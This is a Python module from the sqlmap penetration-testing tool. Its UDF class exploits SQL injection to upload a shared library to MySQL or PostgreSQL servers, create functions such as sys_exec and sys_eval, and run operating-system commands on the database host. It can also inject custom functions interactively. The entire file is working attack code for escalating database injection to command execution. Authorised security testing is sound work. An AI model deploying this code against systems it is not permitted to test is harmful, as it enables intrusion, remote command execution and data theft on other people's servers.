#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os

from lib.core.agent import agent
from lib.core.common import dataToStdout
from lib.core.common import Backend
from lib.core.common import isTechniqueAvailable
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import OS
from lib.core.enums import PAYLOAD
from lib.core.common import unArrayizeValue
from lib.core.exception import sqlmapFilePathException
from lib.core.exception import sqlmapMissingMandatoryOptionException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.exception import sqlmapUserQuitException
from lib.core.unescaper import unescaper
from lib.request import inject

class UDF:
    """
    This class defines methods to deal with User-Defined Functions for
    plugins.
    """

    def __init__(self):
        self.createdUdf = set()
        self.udfs = {}
        self.udfToCreate = set()

    def __askOverwriteUdf(self, udf):
        message = "UDF '%s' already exists, do you " % udf
        message += "want to overwrite it? [y/N] "
        output = readInput(message, default="N")

        if output and output[0] in ("y", "Y"):
            return True
        else:
            return False

    def __checkExistUdf(self, udf):
        logger.info("checking if UDF '%s' already exist" % udf)

        query = agent.forgeCaseStatement(queries[Backend.getIdentifiedDbms()].check_udf.query % (udf, udf))
        return inject.getValue(query, resumeValue=False, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY)

    def udfCheckAndOverwrite(self, udf):
        exists = self.__checkExistUdf(udf)
        overwrite = True

        if exists:
            overwrite = self.__askOverwriteUdf(udf)

        if overwrite:
            self.udfToCreate.add(udf)

    def udfCreateSupportTbl(self, dataType):
        debugMsg = "creating a support table for user-defined functions"
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, dataType)

    def udfForgeCmd(self, cmd):
        if not cmd.startswith("'"):
            cmd = "'%s" % cmd

        if not cmd.endswith("'"):
            cmd = "%s'" % cmd

        return cmd

    def udfExecCmd(self, cmd, silent=False, udfName=None):
        if udfName is None:
            udfName = "sys_exec"

        cmd = unescaper.unescape(self.udfForgeCmd(cmd))

        return inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)

    def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):
        if udfName is None:
            udfName = "sys_eval"

        if conf.direct:
            output = self.udfExecCmd(cmd, udfName=udfName)

            if output and isinstance(output, (list, tuple)):
                new_output = ""

                for line in output:
                    new_output += line.replace("\r", "\n")

                output = new_output
        else:
            cmd = unescaper.unescape(self.udfForgeCmd(cmd))

            inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
            output = unArrayizeValue(inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last, safeCharEncode=False))
            inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        return output

    def udfCheckNeeded(self):
        if ( not conf.rFile or ( conf.rFile and not Backend.isDbms(DBMS.PGSQL) ) ) and "sys_fileread" in self.sysUdfs:
            self.sysUdfs.pop("sys_fileread")

        if not conf.osPwn:
            self.sysUdfs.pop("sys_bineval")

        if not conf.osCmd and not conf.osShell and not conf.regRead:
            self.sysUdfs.pop("sys_eval")

            if not conf.osPwn and not conf.regAdd and not conf.regDel:
                self.sysUdfs.pop("sys_exec")

    def udfSetRemotePath(self):
        errMsg = "udfSetRemotePath() method must be defined within the plugin"
        raise sqlmapUnsupportedFeatureException(errMsg)

    def udfSetLocalPaths(self):
        errMsg = "udfSetLocalPaths() method must be defined within the plugin"
        raise sqlmapUnsupportedFeatureException(errMsg)

    def udfCreateFromSharedLib(self, udf=None, inpRet=None):
        errMsg = "udfCreateFromSharedLib() method must be defined within the plugin"
        raise sqlmapUnsupportedFeatureException(errMsg)

    def udfInjectCore(self, udfDict):
        for udf in udfDict.keys():
            if udf in self.createdUdf:
                continue

            self.udfCheckAndOverwrite(udf)

        if len(self.udfToCreate) > 0:
            self.udfSetRemotePath()
            self.writeFile(self.udfLocalFile, self.udfRemoteFile, "binary")

        for udf, inpRet in udfDict.items():
            if udf in self.udfToCreate and udf not in self.createdUdf:
                self.udfCreateFromSharedLib(udf, inpRet)

        if Backend.isDbms(DBMS.MYSQL):
            supportTblType = "longtext"
        elif Backend.isDbms(DBMS.PGSQL):
            supportTblType = "text"

        self.udfCreateSupportTbl(supportTblType)

    def udfInjectSys(self):
        self.udfSetLocalPaths()
        self.udfCheckNeeded()
        self.udfInjectCore(self.sysUdfs)

    def udfInjectCustom(self):
        if Backend.getIdentifiedDbms() not in ( DBMS.MYSQL, DBMS.PGSQL ):
            errMsg = "UDF injection feature is not yet implemented on %s" % Backend.getIdentifiedDbms()
            raise sqlmapUnsupportedFeatureException(errMsg)

        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED) and not conf.direct:
            return

        self.checkDbmsOs()

        if not self.isDba():
            warnMsg = "functionality requested probably does not work because "
            warnMsg += "the curent session user is not a database administrator"
            logger.warn(warnMsg)

        if not conf.shLib:
            msg = "what is the local path of the shared library? "

            while True:
                self.udfLocalFile = readInput(msg)

                if self.udfLocalFile:
                    break
                else:
                    logger.warn("you need to specify the local path of the shared library")
        else:
            self.udfLocalFile = conf.shLib

        if not os.path.exists(self.udfLocalFile):
            errMsg = "the specified shared library file does not exist"
            raise sqlmapFilePathException(errMsg)

        if not self.udfLocalFile.endswith(".dll") and not self.udfLocalFile.endswith(".so"):
            errMsg = "shared library file must end with '.dll' or '.so'"
            raise sqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".so") and Backend.isOs(OS.WINDOWS):
            errMsg = "you provided a shared object as shared library, but "
            errMsg += "the database underlying operating system is Windows"
            raise sqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".dll") and Backend.isOs(OS.LINUX):
            errMsg = "you provided a dynamic-link library as shared library, "
            errMsg += "but the database underlying operating system is Linux"
            raise sqlmapMissingMandatoryOptionException(errMsg)

        self.udfSharedLibName = os.path.basename(self.udfLocalFile).split(".")[0]
        self.udfSharedLibExt = os.path.basename(self.udfLocalFile).split(".")[1]

        msg = "how many user-defined functions do you want to create "
        msg += "from the shared library? "

        while True:
            udfCount = readInput(msg, default=1)

            if isinstance(udfCount, basestring) and udfCount.isdigit():
                udfCount = int(udfCount)

                if udfCount <= 0:
                    logger.info("nothing to inject then")
                    return
                else:
                    break

            elif isinstance(udfCount, int):
                break

            else:
                logger.warn("invalid value, only digits are allowed")

        for x in range(0, udfCount):
            while True:
                msg = "what is the name of the UDF number %d? " % (x + 1)
                udfName = readInput(msg)

                if udfName:
                    self.udfs[udfName] = {}
                    break
                else:
                    logger.warn("you need to specify the name of the UDF")

            if Backend.isDbms(DBMS.MYSQL):
                defaultType = "string"
            elif Backend.isDbms(DBMS.PGSQL):
                defaultType = "text"

            self.udfs[udfName]["input"] = []

            default = 1
            msg = "how many input parameters takes UDF "
            msg += "'%s'? (default: %d) " % (udfName, default)

            while True:
                parCount = readInput(msg, default=default)

                if isinstance(parCount, basestring) and parCount.isdigit() and int(parCount) >= 0:
                    parCount = int(parCount)
                    break

                elif isinstance(parCount, int):
                    break

                else:
                    logger.warn("invalid value, only digits >= 0 are allowed")

            for y in range(0, parCount):
                msg = "what is the data-type of input parameter "
                msg += "number %d? (default: %s) " % ((y + 1), defaultType)

                while True:
                    parType = readInput(msg, default=defaultType)

                    if isinstance(parType, basestring) and parType.isdigit():
                        logger.warn("you need to specify the data-type of the parameter")

                    else:
                        self.udfs[udfName]["input"].append(parType)
                        break

            msg = "what is the data-type of the return "
            msg += "value? (default: %s) " % defaultType

            while True:
                retType = readInput(msg, default=defaultType)

                if isinstance(retType, basestring) and retType.isdigit():
                    logger.warn("you need to specify the data-type of the return value")
                else:
                    self.udfs[udfName]["return"] = retType
                    break

        self.udfInjectCore(self.udfs)

        msg = "do you want to call your injected user-defined "
        msg += "functions now? [Y/n/q] "
        choice = readInput(msg, default="Y")

        if choice[0] in ( "n", "N" ):
            self.cleanup(udfDict=self.udfs)
            return
        elif choice[0] in ( "q", "Q" ):
            self.cleanup(udfDict=self.udfs)
            raise sqlmapUserQuitException

        while True:
            udfList = []
            msg = "which UDF do you want to call?"

            for udf in self.udfs.keys():
                udfList.append(udf)
                msg += "\n[%d] %s" % (len(udfList), udf)

            msg += "\n[q] Quit"

            while True:
                choice = readInput(msg)

                if choice and choice[0] in ( "q", "Q" ):
                    break
                elif isinstance(choice, basestring) and choice.isdigit() and int(choice) > 0 and int(choice) <= len(udfList):
                    choice = int(choice)
                    break
                elif isinstance(choice, int) and choice > 0 and choice <= len(udfList):
                    break
                else:
                    warnMsg = "invalid value, only digits >= 1 and "
                    warnMsg += "<= %d are allowed" % len(udfList)
                    logger.warn(warnMsg)

            cmd = ""
            count = 1
            udfToCall = udfList[choice - 1]

            for inp in self.udfs[udfToCall]["input"]:
                msg = "what is the value of the parameter number "
                msg += "%d (data-type: %s)? " % (count, inp)

                while True:
                    parValue = readInput(msg)

                    if parValue:
                        if "int" not in inp and "bool" not in inp:
                            parValue = "'%s'" % parValue

                        cmd += "%s," % parValue

                        break
                    else:
                        logger.warn("you need to specify the value of the parameter")

                count += 1

            cmd = cmd[:-1]
            msg = "do you want to retrieve the return value of the "
            msg += "UDF? [Y/n] "
            choice = readInput(msg, default="Y")

            if choice[0] in ("y", "Y"):
                output = self.udfEvalCmd(cmd, udfName=udfToCall)

                if output:
                    conf.dumper.string("return value", output)
                else:
                    dataToStdout("No return value\n")
            else:
                self.udfExecCmd(cmd, udfName=udfToCall, silent=True)

            msg = "do you want to call this or another injected UDF? [Y/n] "
            choice = readInput(msg, default="Y")

            if choice[0] not in ("y", "Y"):
                break

        self.cleanup(udfDict=self.udfs)
